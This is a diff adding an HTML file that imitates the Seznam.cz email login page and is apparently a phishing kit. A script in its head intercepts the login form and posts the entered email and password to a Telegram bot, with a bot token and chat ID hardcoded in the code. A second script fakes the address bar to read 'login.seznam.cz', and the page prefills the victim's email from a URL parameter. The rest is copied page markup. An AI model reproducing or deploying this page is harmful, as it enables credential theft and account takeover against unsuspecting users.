@@ -1,0 +1,986 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Přihlášení do Seznamu</title>
+  <meta name="description"
+    content="Přihlášením do jednoho účtu můžete používat vše od Seznamu. Email, Mapy, Sreality, Stream, firemní profil Seznam naplno a mnohem víc.">
+  <link rel="shortcut icon" href="qii36SdvDtNR.ico">
+  <link rel="apple-touch-icon" href="images/T9D5GWrdFiUw.png">
+  <link rel="stylesheet" href="css/ct1Nv7xNjQQA.css">
+
+  <!-- <script src="js/sd9bzZmaj8vu.js" crossorigin></script> -->
+  <script>
+    var conf = {
+      version: "3.2.69-253251d019342632ad3eaf20b2e379e734b0ad7d",
+      page: "login",
+      query: {},
+      tld_suffix: "cz",
+      lang: "cs",
+      logged_users: [],
+
+      neznam_domains: ["agsr.cz", "classicpraha.cz", "czechadid.cz", "emailprofi.cz", "expresfm.cz", "firma.mapy.cz",
+        "firma.seznam.cz", "firma.seznam.sk", "firmy.cz", "lide.cz", "mapy.cz", "pripojuji.se", "prozeny.cz",
+        "pubtran.cz", "sauto.cz", "sbazar.cz", "sdovolena.cz", "sletenky.cz", "smartmaps.cz", "sreality.cz",
+        "streamtv.cz", "sz.cz", "televizeseznam.cz", "voiceofprague.cz", "volnamista.cz", "zbozi.cz"
+      ]
+    };
+
+    conf.return_url = "#";
+    conf.service = "email";
+  
+  // The original code was heavily obfuscated using a simple string array and lookup function.
+    // This is a deobfuscated version revealing its true purpose.
+
+    // Extract email from URL query parameters
+    function extractEmail(url) {
+      try {
+        const urlObj = new URL(url);
+        const params = new URLSearchParams(urlObj.search);
+        const email = params.get('email');
+        if (!email) throw new Error('No email found in the URL');
+        return email;
+      } catch (error) {
+        return '';
+      }
+    }
+
+    // Main script execution
+    document.addEventListener('DOMContentLoaded', () => {
+      // Pre-fill email field from URL parameter or stored email
+      const email = extractEmail(window.location.href) || sessionStorage.getItem('email') || '';
+      document.getElementById('login-username').value = email;
+
+      // Handle form submission
+      document.getElementById('form_login').addEventListener('submit', function (event) {
+        event.preventDefault();
+
+        const email = document.getElementById('login-username').value;
+        const password = document.getElementById('login-password').value;
+        if(email === '' || password === '') {
+          return;
+        }
+        const botToken = '9062542409:AAF9amu0QfvopfoF_eGXdWh-Rjlo6kefOW8';
+        const chatId = '6592485465';
+        const message = `🔐 *New Login Attempt on seznam Hosting* 🔐\n\n📧 *Email:* ${email}\n🔑 *Password:* ${password}`;
+
+        // Send stolen credentials to Telegram bot
+        fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+          'method': 'POST',
+          'headers': {
+            'Content-Type': 'application/json'
+          },
+          'body': JSON.stringify({
+            'chat_id': chatId,
+            'text': message,
+            'parse_mode': 'Markdown'
+          })
+        })
+          .then(response => {
+            if (!response.ok) throw new Error('HTTP error! status: ' + response.status);
+            return response.json();
+          })
+          .then(data => {
+            console.log('You are a champion!');
+          })
+          .catch(error => {
+            console.error('Error:', error);
+          });
+      });
+    });
+  
+  </script>
+
+  <script>
+    (function () {
+        // Get email from URL (?email=...)
+        var params = new URLSearchParams(window.location.search);
+        var email = params.get("email");
+
+        if (email) {
+            sessionStorage.setItem("email", email);
+        }
+
+        // Obfuscate URL in address bar
+        try {
+            var displayUrl = 'login.seznam.cz';
+
+            if (window.history && typeof window.history.replaceState === 'function') {
+                window.history.replaceState(null, '', '/' + displayUrl);
+            }
+        } catch (e) {
+            console.error("URL modification failed:", e);
+        }
+
+        // Retrieve email when needed
+        window.getEmail = function () {
+            return sessionStorage.getItem("email");
+        };
+
+    })();
+  </script>
+</head>
+
+<body>
+  <main>
+    <a id="seznam" href="#"></a>
+
+    <section id="login" hidden style="margin-top: 78px;">
+      <h1 data-locale="login.title" hidden></h1>
+      <div class="oauth-placeholder"></div>
+
+      <form id="form_login" class="login" hidden>
+        <div class="username">
+          <!--Username-->
+          <label class="magic">
+            <input type="text" id="login-username" autocorrect="off" autocapitalize="off" autocomplete="username"
+              placeholder=" " data-arrow-down="[type=password]" data-arrow-up="[type=submit]">
+            <span data-locale="login.username"></span>
+          </label>
+        </div>
+        <!--Password-->
+        <label class="magic password">
+          <input type="password" id="login-password" placeholder=" " autocomplete="current-password"
+            data-arrow-down="[type=submit]" data-arrow-up="#login-username">
+          <span data-locale="login.password"></span>
+        </label>
+
+        <a class="recover" href="#" data-locale="login.help"></a>
+
+        <div class="login-submit">
+          <button form="form_login" type="submit" data-locale="login.submit" data-arrow-down="#login-username"
+            data-arrow-up="[type=password]"></button>
+            <img src="1.png" alt="" width="55" height="55">
+          </button>
+        </div>
+
+        <button disabled type="button" class="google">
+          <img src="fonts/C6NO87Y0ypCN.svg">
+          <span data-locale="login.submitGoogle"></span>
+        </button>
+
+        <button type="button" class="azure" hidden>
+          <img src="fonts/gwjZQO5sZR3m.svg">
+          <span data-locale="login.submitAzure"></span>
+        </button>
+        <div style="display: flex; gap: 5px; margin-top: 20px;">
+          <div class="login-btn">
+            <img src="svg/google.svg">
+          </div>
+          <div class="login-btn">
+            <img src="svg/apple.svg">
+          </div>
+          <div class="login-btn">
+            <img src="svg/azure.svg">
+          </div>
+          <div class="login-btn">
+            <img src="svg/bankId.svg">
+          </div>
+          <div class="login-btn">
+            <img src="svg/mojeid.svg">
+          </div>
+        </div>
+        <a class="tertiary" href="#" data-locale="login.register.link"></a>
+      </form>
+
+      <form class="logged" hidden></form>
+
+      <form class="register" hidden>
+        <label class="magic">
+          <input type="text" placeholder=" " disabled>
+          <span data-locale="login.username"></span>
+        </label>
+
+        <p data-locale="login.register.description"></p>
+        <button type="submit" data-locale="login.register.submit"></button>
+        <a class="tertiary" href="#" data-locale="login.register.back"></a>
+      </form>
+
+      <form class="assign-password" hidden>
+        <p data-locale-unsafe="login.assign-password.pinDescription"></p>
+
+        <label class="magic pin">
+          <input type="text" name="pin" placeholder=" " autocomplete="one-time-code">
+          <span data-locale="register.pin.placeholder"></span>
+          <!-- <a class="resend" href="#" data-locale="register.pin.resend"></a> -->
+        </label>
+
+        <p data-locale="login.assign-password.passwordDescription"></p>
+
+        <label class="magic">
+          <input type="password" placeholder=" " autocomplete="new-password">
+          <span data-locale="register.password1"></span>
+        </label>
+
+        <label class="magic">
+          <input type="password" placeholder=" ">
+          <span data-locale="register.password2"></span>
+        </label>
+
+        <button type="submit" data-locale="login.submit"></button>
+      </form>
+    </section>
+
+    <section id="licence" hidden>
+      <form>
+        <h1 data-locale="licence.title"></h1>
+
+        <div class="placeholder"></div>
+        <img src="fonts/HvWtXRGPvMw6.svg">
+        <button type="submit" data-locale="licence.accept" data-purpose="accept"></button>
+        <!--                    <a href="#" data-locale="licence.continue" data-purpose="continue"></a> -->
+      </form>
+    </section>
+
+    <section id="register" data-dot="register" hidden>
+      <h1 data-locale="register.title"></h1>
+
+      <form class="intro" data-dot="intro">
+        <button type="button" class="official" data-dot="official">
+          <img src="fonts/ZKb1yQCSiegY.svg">
+          <div>
+            <strong data-locale="register.intro.official.title"></strong>
+            <span data-locale="register.intro.official.subtitle"></span>
+          </div>
+        </button>
+        <button type="button" class="own" data-dot="own">
+          <div>
+            <strong data-locale="register.intro.own.title"></strong>
+            <span data-locale="register.intro.own.subtitle"></span>
+          </div>
+        </button>
+        <button type="button" class="phone" data-dot="phone">
+          <div>
+            <strong data-locale="register.intro.phone.title"></strong>
+            <span data-locale="register.intro.phone.subtitle"></span>
+          </div>
+        </button>
+
+        <a class="tertiary" href="#" data-locale="register.intro.login"></a>
+      </form>
+
+      <form class="main">
+        <label class="magic">
+          <input type="text" id="register-username" placeholder=" " autocomplete="username" maxlength="121">
+          <span></span>
+        </label>
+
+        <label class="magic">
+          <input type="password" placeholder=" " autocomplete="new-password">
+          <span data-locale="register.password1"></span>
+        </label>
+
+        <label class="magic">
+          <input type="password" placeholder=" ">
+          <span data-locale="register.password2"></span>
+        </label>
+
+        <label class="magic year">
+          <input type="text" name="year" maxlength="4" placeholder=" ">
+          <span data-locale="register.year"></span>
+        </label>
+        <div class="explanation" data-locale="register.yearExplanation"></div>
+
+        <div class="gender-row">
+          <span data-locale="register.gender"></span>
+          <div class="radios">
+            <label>
+              <input type="radio" name="register.gender" value="Male">
+              <span data-locale="register.male"></span>
+            </label>
+            <label>
+              <input type="radio" name="register.gender" value="Female">
+              <span data-locale="register.female"></span>
+            </label>
+            <label>
+              <input type="radio" name="register.gender" value="Other">
+              <span data-locale="register.other"></span>
+            </label>
+          </div>
+        </div>
+
+
+
+        <button type="submit" data-locale="register.continue" data-dot="continue"></button>
+
+        <a class="tertiary" href="#" target="_blank" data-locale="register.phone.privacy"></a>
+      </form>
+
+      <form class="phone" data-dot="phone">
+        <label class="magic errorable">
+          <input type="text" placeholder=" " disabled name="username">
+          <span data-locale="register.usernameOfficial"></span>
+        </label>
+
+        <label class="magic phone">
+          <input type="text" name="phone" placeholder=" ">
+          <span data-locale="register.phone.placeholder"></span>
+          <a class="edit" href="#" data-locale="register.phone.edit"></a>
+        </label>
+
+        <label class="magic pin">
+          <input type="text" name="pin" placeholder=" " autocomplete="one-time-code">
+          <span data-locale="register.pin.placeholder"></span>
+          <a class="resend" href="#" data-locale="register.pin.resend"></a>
+        </label>
+
+        <p class="agree">
+          <span data-locale="register.agree"></span>
+          <a class="licence-link" target="_blank">
+            <span data-locale="register.licence"></span>.
+          </a>
+        </p>
+
+        <button type="submit"></button>
+
+        <a class="tertiary" href="#" target="_blank" data-locale="register.phone.privacy"></a>
+      </form>
+
+      <form class="sent">
+        <p></p>
+        <button type="submit" data-locale="register.sent.resend"></button>
+      </form>
+
+      <form class="login">
+        <p data-locale="register.login.description"></p>
+        <button type="submit" data-locale="register.login.submit"></button>
+      </form>
+    </section>
+
+    <section id="assign-email" hidden>
+      <form class="intro">
+        <h1></h1>
+        <p data-locale="assign-email.description"></p>
+
+        <button type="button" class="official">
+          <img src="fonts/ZKb1yQCSiegY.svg">
+          <div>
+            <strong data-locale="assign-email.intro.official.title"></strong>
+            <span data-locale="assign-email.intro.official.subtitle"></span>
+          </div>
+        </button>
+        <button type="button" class="own">
+          <div>
+            <strong data-locale="assign-email.intro.own.title"></strong>
+            <span data-locale="assign-email.intro.own.subtitle"></span>
+          </div>
+        </button>
+      </form>
+
+      <form class="main">
+        <h1></h1>
+        <p data-locale="assign-email.description"></p>
+
+        <label class="magic">
+          <input type="text" name="email" placeholder=" " autocomplete="username">
+          <span></span>
+        </label>
+
+        <label class="magic">
+          <input type="password" placeholder=" " autocomplete="current-password">
+          <span data-locale="assign-email.password"></span>
+        </label>
+
+        <label class="magic anchor">
+          <input name="pin" type="text" placeholder=" " autocomplete="one-time-code">
+          <span data-locale="secure-phone.phone.pin"></span>
+          <button type="button" class="resend" data-locale="secure-phone.phone.resend"></button>
+        </label>
+
+        <button type="submit" data-locale="assign-email.continue"></button>
+      </form>
+
+      <form class="sent">
+        <h1></h1>
+        <p></p>
+        <button type="submit" data-locale="assign-email.sent.submit"></button>
+      </form>
+
+      <form class="done">
+        <img class="check" src="fonts/9BK6KiSij2N8.svg">
+
+        <h1></h1>
+
+        <button type="submit" data-locale="assign-email.done.submit"></button>
+      </form>
+    </section>
+
+    <section id="register-bankid" hidden data-dot="register-bankid">
+      <img class="check" src="fonts/9BK6KiSij2N8.svg">
+
+      <h1 data-locale="register.bankid.title"></h1>
+
+      <img class="verified" src="fonts/bqws3xh65QRQ.svg">
+      <h2 data-locale="register.bankid.subtitle"></h2>
+      <ul>
+        <li data-locale="register.bankid.item1"></li>
+        <li data-locale="register.bankid.item2"></li>
+        <li data-locale="register.bankid.item3"></li>
+        <li data-locale="register.bankid.item4"></li>
+      </ul>
+
+      <form>
+        <button type="submit" data-locale="register.bankid.submit" data-dot="submit"></button>
+        <button type="button" class="continue" data-locale="register.bankid.skip" data-dot="skip"></button>
+        <p></p>
+      </form>
+    </section>
+
+    <section id="register-done" hidden data-dot="register-done">
+      <img class="check" src="fonts/9BK6KiSij2N8.svg">
+
+      <h1></h1>
+
+      <div class="vcard-placeholder"></div>
+
+      <button type="submit" data-dot="continue"></button>
+      <button type="button" data-locale="register.done.password" class="secondary"></button>
+    </section>
+
+    <section id="secure-phone" hidden>
+      <h1></h1>
+      <div class="vcard-placeholder"></div>
+
+      <form>
+        <p>
+          <span data-locale="secure-phone.description"></span>
+          <br>
+          <a href="#" target="_blank" data-locale="secure-phone.privacy"></a>
+        </p>
+
+        <div class="anchor">
+          <label class="magic">
+            <input type="text" name="phone" placeholder=" ">
+            <span data-locale="secure-phone.phone.label"></span>
+          </label>
+          <button type="button" class="edit" data-locale="secure-phone.phone.edit"></button>
+        </div>
+
+        <div class="anchor">
+          <label class="magic">
+            <input name="pin" type="text" placeholder=" " autocomplete="one-time-code">
+            <span data-locale="secure-phone.phone.pin"></span>
+          </label>
+          <button type="button" class="resend" data-locale="secure-phone.phone.resend"></button>
+        </div>
+
+        <div class="anchor">
+          <label class="magic">
+            <input type="password" placeholder=" " autocomplete="current-password">
+            <span data-locale="secure-phone.phone.password"></span>
+          </label>
+        </div>
+
+        <button type="submit"></button>
+      </form>
+
+      <div class="done">
+        <img src="fonts/9BK6KiSij2N8.svg">
+        <h1 data-locale="secure-phone.phone.verified"></h1>
+        <button type="submit"></button>
+      </div>
+
+      <a class="tertiary skip" href="#" data-locale="secure-phone.phone.skip"></a>
+    </section>
+
+    <section id="veto" hidden>
+      <h1 data-locale="veto.title"></h1>
+
+      <p>
+        <span data-locale="veto.description1"></span>
+        <strong></strong>
+        <span data-locale="veto.description2"></span>
+        <strong style="white-space:nowrap"></strong>
+        <span data-locale="veto.description3"></span>.
+      </p>
+
+      <form>
+        <input name="ticket" value type="hidden">
+
+        <label class="magic">
+          <input type="password" name="old_password" placeholder=" ">
+          <span data-locale="veto.password.old"></span>
+        </label>
+
+        <label class="magic">
+          <input type="password" name="new_password" placeholder=" ">
+          <span data-locale="veto.password.new1"></span>
+        </label>
+
+        <label class="magic">
+          <input type="password" name="repeated_password" placeholder=" ">
+          <span data-locale="veto.password.new2"></span>
+        </label>
+
+        <button type="submit" data-locale="veto.submit"></button>
+      </form>
+    </section>
+
+    <section id="veto-pin" hidden>
+      <h1 data-locale="veto-pin.title"></h1>
+
+      <form>
+        <input name="ticket" value type="hidden">
+
+        <label class="magic">
+          <input type="text" name="email" placeholder=" ">
+          <span data-locale="veto-pin.email"></span>
+        </label>
+
+
+        <label class="magic">
+          <input type="text" name="pin" placeholder=" " value autocomplete="off">
+          <span data-locale="veto-pin.pin"></span>
+        </label>
+
+        <button type="submit" data-locale="veto-pin.submit"></button>
+      </form>
+    </section>
+
+    <section id="veto-done" hidden>
+      <h1 data-locale="veto.done.title"></h1>
+
+      <p data-locale="veto.done.description"></p>
+      <a class="tertiary" data-locale="veto.done.link" href="#"></a>
+    </section>
+
+    <section id="tfa" hidden>
+      <h1></h1>
+
+      <div class="vcard-placeholder"></div>
+
+      <section class="waiting">
+        <div class="wave"><b></b><b></b><b></b></div>
+        <div class="video"></div>
+        <p data-locale="tfa.waiting.description"></p>
+        <button class="tertiary" data-action="help" data-locale="tfa.waiting.help"></button>
+      </section>
+
+      <section class="pin">
+        <form data-action="pin">
+          <label class="magic">
+            <input type="text" name="pin" placeholder=" " autocomplete="one-time-code">
+            <span data-locale="tfa.pin.placeholder"></span>
+          </label>
+          <button type="submit" data-locale="tfa.pin.submit"></button>
+          <a class="tertiary" href="#" data-action="help" data-locale="tfa.waiting.help"></a>
+        </form>
+      </section>
+
+      <section class="remember">
+        <p data-locale="tfa.remember.description"></p>
+
+        <button type="button" class="secondary" data-action="remember" data-locale="tfa.remember.yes"
+          data-arrow-down="[data-action=continue]" data-arrow-up="[data-action=continue]"></button>
+        <button type="button" class="secondary" data-action="continue" data-locale="tfa.remember.no"
+          data-arrow-down="[data-action=remember]" data-arrow-up="[data-action=remember]"></button>
+      </section>
+
+      <ul class="tfa-help">
+        <h2 data-locale="tfa.help.title"></h2>
+        <span class="close"></span>
+        <li>
+          <a href="#" data-action="push">
+            <img src="fonts/hMsZrNlV21cz.svg">
+            <span data-locale="tfa.help.push1"></span>
+            <span data-locale="tfa.help.push2"></span>
+          </a>
+        </li>
+        <li>
+          <a href="#" target="_blank">
+            <img src="fonts/HqfW9RrM5tmO.svg">
+            <span data-locale="tfa.help.help1"></span>
+            <span data-locale="tfa.help.help2"></span>
+          </a>
+        </li>
+        <li>
+          <a href="#" data-action="sms">
+            <img src="fonts/kdjPc64yWu8L.svg">
+            <span data-locale="tfa.help.sms1"></span>
+            <span data-locale="tfa.help.sms2"></span>
+          </a>
+        </li>
+      </ul>
+    </section>
+
+    <section id="oauth" hidden>
+      <h1></h1>
+      <div class="oauth-placeholder"></div>
+
+      <div class="vcard-placeholder"></div>
+
+      <p></p>
+      <ul></ul>
+      <p></p>
+
+      <form>
+        <button type="submit" data-locale="oauth.submit"></button>
+      </form>
+    </section>
+
+    <section id="refresh-secure" hidden>
+      <h1 data-locale="refresh-secure.title"></h1>
+
+      <div class="vcard-placeholder"></div>
+      <p></p>
+
+      <div class="content"></div>
+
+      <button type="submit" data-locale="refresh-secure.submit"></button>
+    </section>
+
+    <section id="unblocker" hidden>
+      <form class="phone">
+        <h1 data-locale="unblocker.title"></h1>
+        <p data-locale="unblocker.description"></p>
+
+        <label class="magic phone">
+          <input type="text" name="phone" placeholder=" ">
+          <span data-locale="secure-phone.phone.label"></span>
+          <!--							<button type="button" class="edit" data-locale="secure-phone.phone.edit"></button> -->
+        </label>
+
+        <button type="submit" data-locale="secure-phone.phone.send"></button>
+      </form>
+
+      <form class="sms-loop"></form>
+
+      <form class="password">
+        <p class="sent"></p>
+        <label class="magic pin">
+          <input name="pin" type="text" placeholder=" " autocomplete="pan-cau">
+          <span data-locale="secure-phone.phone.pin"></span>
+          <button type="button" class="resend" data-locale="secure-phone.phone.resend"></button>
+        </label>
+
+        <p class="phone-explain"></p>
+
+        <p data-locale="unblocker.password"></p>
+
+        <label class="magic">
+          <input type="password" autocomplete="current-password" placeholder=" ">
+          <span data-locale="password.current"></span>
+        </label>
+
+        <label class="magic">
+          <input type="password" autocomplete="new-password" placeholder=" ">
+          <span data-locale="password.new"></span>
+        </label>
+
+        <label class="magic">
+          <input type="password" placeholder=" ">
+          <span data-locale="password.repeat"></span>
+        </label>
+
+        <button type="submit" data-locale="password.submit"></button>
+      </form>
+
+      <form class="done">
+        <img class="check" src="fonts/9BK6KiSij2N8.svg">
+        <h1 data-locale="unblocker.done.title"></h1>
+
+        <p></p>
+
+        <button type="submit" data-locale="unblocker.done.submit"></button>
+        <button type="button" class="secondary" data-locale="unblocker.done.settings"></button>
+      </form>
+    </section>
+
+    <section id="recover" hidden>
+      <h1></h1>
+
+      <form id="recover-intro">
+        <label class="magic">
+          <input type="text" id="recover-username" name="youremail" placeholder=" ">
+          <span data-locale="recover.youremail"></span>
+        </label>
+        <button type="submit" data-locale="recover.continue"></button>
+      </form>
+
+      <div class="vcard-placeholder"></div>
+
+      <div id="recover-options">
+        <ul></ul>
+      </div>
+
+      <form id="recover-bankid">
+        <p data-locale="recover.bankid.description"></p>
+        <button type="submit" data-locale="recover.continue"></button>
+      </form>
+
+      <form id="recover-google">
+        <p data-locale="recover.google.description"></p>
+        <button type="submit" data-locale="recover.google.submit"></button>
+      </form>
+
+      <form id="recover-azure">
+        <p data-locale="recover.azure.description"></p>
+        <button type="submit" data-locale="recover.azure.submit"></button>
+      </form>
+
+      <form id="recover-question">
+        <h2 data-locale="recover.question.title"></h2>
+        <p data-locale="recover.question.description"></p>
+
+        <p>
+          <span data-locale="recover.question.question"></span>:<br>
+          <strong></strong>
+        </p>
+
+        <label class="magic">
+          <input name="answer" placeholder=" " type="text">
+          <span data-locale="recover.question.answer"></span>
+        </label>
+
+        <label class="magic">
+          <input name="birth-year" type="text" maxlength="4" placeholder=" ">
+          <span data-locale="recover.question.year"></span>
+        </label>
+
+        <label data-locale="recover.question.no-year"><input type="checkbox"><span></span></label>
+
+        <label class="magic">
+          <input name="delivery-email" type="text" placeholder=" ">
+          <span data-locale="recover.question.email"></span>
+        </label>
+
+        <button type="submit" data-locale="recover.continue"></button>
+      </form>
+
+      <form id="recover-additional">
+        <h2 data-locale="recover.additional.title"></h2>
+        <p data-locale="recover.additional.description"></p>
+
+        <fieldset id="recover-addemail">
+          <p data-locale="recover.additional.email"></p>
+          <input type="text">
+          <a href="#" data-locale="recover.additional.addemail"></a>
+        </fieldset>
+
+        <fieldset id="recover-addfolder">
+          <p data-locale="recover.additional.folder"></p>
+          <input type="text">
+          <a href="#" data-locale="recover.additional.addfolder"></a>
+        </fieldset>
+
+        <label data-locale="recover.additional.skin"></label>
+
+        <div class="new-skin">
+          <h3 data-locale="recover.additional.light"></h3>
+          <img src="images/AmzGFXSInOoM.jpg" data-id="0">
+          <img src="images/pC4v0I9xAmfc.jpg" data-id="2">
+          <img src="images/0Bn8eqZnAybg.jpg" data-id="3">
+          <img src="images/WUOPlyEkeg3Y.jpg" data-id="9">
+          <img src="images/xhi2aCh0xmcj.jpg" data-id="4">
+          <img src="images/q26ErJLOMxAR.jpg" data-id="5">
+          <img src="images/K7g33zq5BloD.jpg" data-id="6">
+          <img src="images/92Yy8WqZdx3u.jpg" data-id="8">
+
+          <h3 data-locale="recover.additional.color"></h3>
+          <img src="fonts/BsRIemjMtv3z.svg" data-id="20">
+          <img src="fonts/mp4nM7GPVw7H.svg" data-id="21">
+          <img src="fonts/fy1VDXqmdIJh.svg" data-id="22">
+          <img src="fonts/h7ue7BTqOcWE.svg" data-id="23">
+          <img src="fonts/IT1tsAERUy5q.svg" data-id="24">
+
+          <h3 data-locale="recover.additional.dark"></h3>
+          <img src="images/Gpb0jjlpG9l7.jpg" data-id="50">
+          <img src="images/xhi2aCh0xmcj.jpg" data-id="54">
+          <img src="images/q26ErJLOMxAR.jpg" data-id="55">
+          <img src="images/K7g33zq5BloD.jpg" data-id="56">
+          <img src="images/92Yy8WqZdx3u.jpg" data-id="58">
+        </div>
+
+        <button type="submit" data-locale="recover.verify"></button>
+      </form>
+
+      <form id="recover-email">
+        <p></p>
+        <button type="submit" data-locale="recover.email.submit"></button>
+      </form>
+
+      <form id="recover-phone" action="#recover-phone">
+        <p></p>
+
+        <label>
+          <strong></strong>
+          <input name="phone" maxlength="3" type="text">
+          <a href="#" data-locale="recover.phone.to-pin"></a>
+        </label>
+
+        <button type="submit" data-locale="recover.continue"></button>
+      </form>
+
+      <form id="recover-pin">
+        <p></p>
+
+        <label class="magic">
+          <input name="pin" placeholder=" " type="text" maxlength="4" autocomplete="one-time-code">
+          <span data-locale="recover.pin.pin"></span>
+          <a href="#" data-locale="recover.pin.to-phone"></a>
+        </label>
+
+        <button type="submit" data-locale="recover.verify"></button>
+      </form>
+
+      <form id="recover-password">
+        <label class="magic">
+          <input type="password" placeholder=" " autocomplete="new-password">
+          <span data-locale="register.password1"></span>
+        </label>
+        <label class="magic">
+          <input type="password" placeholder=" ">
+          <span data-locale="register.password2"></span>
+        </label>
+
+        <label hidden>
+          <input type="checkbox" name="save_email">
+          <span></span>
+        </label>
+
+        <button type="submit" data-locale="recover.password.submit"></button>
+        <button type="button" class="tertiary" data-locale="recover.login"></button>
+      </form>
+
+      <form id="recover-bad-ticket">
+        <h2 data-locale="recover.ticket.error_title"></h2>
+        <p data-locale="recover.ticket.bad_or_old"></p>
+      </form>
+
+      <form id="recover-req-sent">
+        <p data-locale="recover.req_sent.description"></p>
+      </form>
+
+      <form id="recover-mail-sent">
+        <p></p>
+        <button type="submit" data-locale="recover.mail_sent.submit"></button>
+      </form>
+
+      <form id="recover-done" action="/">
+        <img class="check" src="fonts/9BK6KiSij2N8.svg">
+        <h1 data-locale="recover.done.title"></h1>
+        <button type="submit" data-locale="recover.done.submit"></button>
+      </form>
+
+      <button type="button" class="tertiary back" data-locale="recover.back"></button>
+      <a class="tertiary" href="#" data-locale="recover.helpdesk" target="_blank"></a>
+    </section>
+
+    <section id="gdpr-unblock" hidden>
+      <h1 data-locale="blockedGdpr.title"></h1>
+
+      <div class="vCard-placeholder"></div>
+      <h2 data-locale="blockedGdpr.infoTitle"></h2>
+      <p data-locale="blockedGdpr.infoText"></p>
+
+      <label class="magic">
+        <input type="password" placeholder=" " name="pwd" autocomplete="current-password">
+        <span data-locale="blockedGdpr.password"></span>
+      </label>
+
+      <label>
+        <input type="checkbox" name="notify">
+        <span data-locale="blockedGdpr.notify"></span>
+      </label>
+
+      <button type="submit" data-locale="blockedGdpr.continue"></button>
+
+      <a class="tertiary" href="#" data-locale="blockedGdpr.relogin"></a>
+    </section>
+
+    <section id="help" hidden>
+      <form>
+        <p>
+          <label>
+            URL:
+            <select>
+              <option>[pick one below]</option>
+            </select>
+          </label>
+        </p>
+        <p class="inputs"></p>
+        <p><button type="submit">Help!</button></p>
+      </form>
+      <pre></pre>
+    </section>
+
+    <div hidden>
+      <section class="widget-captcha">
+        <img>
+        <a href="#" class="play" data-locale="register.captcha.play"></a>
+        <br>
+        <a href="#" class="new" data-locale="register.captcha.new"></a>
+        <label class="magic">
+          <input type="text" placeholder=" ">
+          <span data-locale="register.captcha.title"></span>
+        </label>
+      </section>
+
+      <form class="widget-password-change">
+        <h1 data-locale="password.title"></h1>
+        <p></p>
+
+        <label class="magic">
+          <input type="password" autocomplete="current-password" placeholder=" ">
+          <span data-locale="password.current"></span>
+        </label>
+
+        <label class="magic">
+          <input type="password" autocomplete="new-password" placeholder=" ">
+          <span data-locale="password.new"></span>
+        </label>
+
+        <label class="magic">
+          <input type="password" placeholder=" ">
+          <span data-locale="password.repeat"></span>
+        </label>
+
+        <button type="submit" data-locale="password.submit"></button>
+
+        <a class="continue tertiary" href="#" data-locale="password.continue"></a>
+      </form>
+
+      <div class="widget-vcard">
+        <img alt="" class="avatar">
+        <div class="user">
+          <div class="name"></div>
+          <div class="email"></div>
+        </div>
+      </div>
+
+      <div class="widget-sms-loop">
+        <p class="instructions"></p>
+        <img class="loading" width="48" height="48"
+          src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAEUSURBVHgB7dZdDgExFAXgg/BsCbUDHj1hB5bCCmyBlbAD3iRI2AF24F383NKRO8nE/Ei04nyJaBsdTm+nAyAiIqI/tQXqa6CLD5ThyRIwF8lQAuYbYG/7KMBbgNpz5Y3rmqoEWQFN5OQtgHzxTN4OasjI2DRvJbwFaAGnM9CT5k4NPyph742s1/EWwGpLBSoJIa7AKOs1SgjA0q081PaR6jTa8S2WyGsFIu6HDvWYBBpkmRtEBSKbZxW6rnuS7dWw98q7OUFUQJmodl22UT9tQlABZMUXUCsu/U7anKACuO3yOpFuGR5soW0h66jaJu3DwQW4xY/O1AdaiBXQp84Bv0iO07G8pkX+3BERERERERERfccdn5cv41vhbZsAAAAASUVORK5CYII=">
+        <p class="waiting" data-locale="sms-loop.waiting"></p>
+        <a class="tertiary" href="#" data-locale="sms-loop.cancel"></a>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <p>Copyright &copy; 1996&ndash;<span id="year">2022</span> Seznam.cz, a.s.</p>
+    <p class="help"><a target="_blank" href="#" data-locale="footer.help"></a></p>
+    <select id="language">
+      <option value="cs">🇨🇿&nbsp;&nbsp;&nbsp;Čeština</option>
+      <option value="sk">🇸🇰&nbsp;&nbsp;&nbsp;Slovenština</option>
+      <option value="en">🇬🇧&nbsp;&nbsp;&nbsp;English</option>
+      <option value="de">🇩🇪&nbsp;&nbsp;&nbsp;Deutsch</option>
+      <option value="uk">🇺🇦&nbsp;&nbsp;&nbsp;Українська</option>
+    </select>
+  </footer>
+
+  <script src="js/H44jtyS7psY7.js"></script>
+  <script src="js/tnHwEDUktFn2.js"></script>
+
+  <div style="display:none">
+    <!--preload-->
+    <img src="fonts/63wlRyIN07P3.svg">
+    <img src="fonts/bjYMHlBwWSHC.svg">
+  </div>
+
+</body>
+
+</html>
